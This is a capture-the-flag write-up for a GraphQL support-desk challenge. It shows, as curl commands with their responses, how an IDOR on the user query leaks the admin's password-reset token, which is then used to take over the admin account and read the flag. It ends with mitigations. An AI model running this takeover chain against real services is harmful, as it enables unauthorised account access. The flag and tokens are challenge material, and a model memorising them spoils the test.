# StaffDesk — CTF Writeup

**Flag:** `UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}`

**Category:** Web / GraphQL IDOR

**Target:** `http://52.76.96.108:3014` (GraphQL at `/graphql`)

## Summary

The challenge is a staff support-desk app exposing a GraphQL API with an
`administrator` account that can read the master key (`flag` query). The
intended vulnerability is an IDOR on the `user(id:)` resolver that leaks the
admin's plaintext password-reset token, which is then used to take over the
admin account.

## Recon — Introspection

Introspection is enabled. Dumping the schema shows the full attack surface:

```graphql
type Query {
  me: User
  user(id: Int!): User
  tickets: [Ticket]
  flag: String!          # "forbidden: admin only"
}

type Mutation {
  register(username: String!, password: String!): AuthPayload!
  login(username: String!, password: String!): AuthPayload!
  resetPassword(resetToken: String!, newPassword: String!): AuthPayload!
  fileTicket(subject: String!): Ticket!
}

type User {
  id: Int!
  username: String!
  role: String!          # "user" | "admin"
  email: String!
  resetToken: String     # ⚠️ exposed on every user
  joinedAt: String
}
```

Two important fields:
* `Query.user(id:)` — no authorization check; any authenticated user can read
  any other user's profile.
* `User.resetToken` — the plaintext password-reset token is returned in the
  response. This is the IDOR / information disclosure.

## Exploitation

### 1. Register a low-privilege account

```bash
curl -X POST http://52.76.96.108:3014/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { register(username:\"pwn\", password:\"pwn\") { token user { id } } }"}'
```

### 2. IDOR — read the admin's profile (including `resetToken`)

The admin is `id: 1`. The `resetToken` is leaked directly:

```bash
curl -X POST http://52.76.96.108:3014/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <our_token>" \
  -d '{"query":"{ user(id:1) { id username role resetToken } }"}'
# → { "username":"admin", "role":"admin",
#      "resetToken":"fd49fe780f709a03137a33d7e7028949" }
```

The returned token rotates after a failed `resetPassword` attempt, so the
trick is to feed the **current** value straight into `resetPassword`:

### 3. Reset the admin's password and obtain an admin JWT

```bash
RT="fd49fe780f709a03137a33d7e7028949"
curl -X POST http://52.76.96.108:3014/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation { resetPassword(resetToken:\\\"$RT\\\", newPassword:\\\"pwned999\\\") { token user { role } } }\"}"
# → token: 410e7cb602a57d525f219022baae4c27aee6958d39ea52f451934278279b30a5
#   user.role: "admin"
```

### 4. Read the master key

```bash
curl -X POST http://52.76.96.108:3014/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer 410e7cb602a57d525f219022baae4c27aee6958d39ea52f451934278279b30a5" \
  -d '{"query":"{ flag }"}'
# → "UCSI26{gr4phql_1d0r_2_admin_t4k30v3r}"
```

## Vulnerability chain

1. **Information disclosure / over-fetching** — the `User` type exposes
   `resetToken` to anyone who can read the user. Reset tokens should be
   write-only and only delivered out-of-band (e.g., via email).
2. **Broken access control (IDOR)** — `Query.user(id:)` has no
   "you can only read yourself" guard, so any authenticated caller can read
   any user's record by guessing/iterating the integer id.
3. **Insufficient rotation** — the reset token only rotates on a failed
   `resetPassword` attempt, so the value returned by `user(id:1)` is still
   valid until the attacker misuses it.

## Mitigations

* Restrict `Query.user` to "self or admin"; expose a separate, sanitized
  public profile type without `resetToken`/`joinedAt`/etc.
* Make `resetToken` write-only — never return it from any query. Generate it
  server-side, store its hash, and email the plaintext to the user.
* Rotate the reset token on every read and bind it to a short TTL.
* Gate `Query.flag` behind a server-side role check on the *resolved* user,
  not on a client-supplied field.
